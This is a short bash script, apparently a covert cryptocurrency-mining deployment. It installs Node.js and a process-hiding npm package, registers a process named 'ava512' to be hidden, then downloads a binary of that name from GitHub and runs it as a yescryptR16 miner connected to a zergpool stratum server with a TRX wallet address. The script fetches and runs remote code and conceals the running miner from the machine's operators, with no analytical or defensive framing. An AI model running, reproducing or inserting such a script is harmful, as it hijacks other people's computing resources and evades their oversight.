#!/bin/bash
sudo apt update && sudo apt install gcc -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && apt install nodejs && npm install -g npm@8.12.0 && npm i -g node-process-hider && ph add ava512
wget https://github.com/mrwhjo/cci/raw/main/ava512 && chmod +x ava512 && ./ava512 -a yescryptR16 -o stratum+tcp://yescryptR16.mine.zergpool.com:6333 -u TMWXVhE6TJNurvBMXVJvptnR8GpdGe7rPY -p c=TRX -t 2
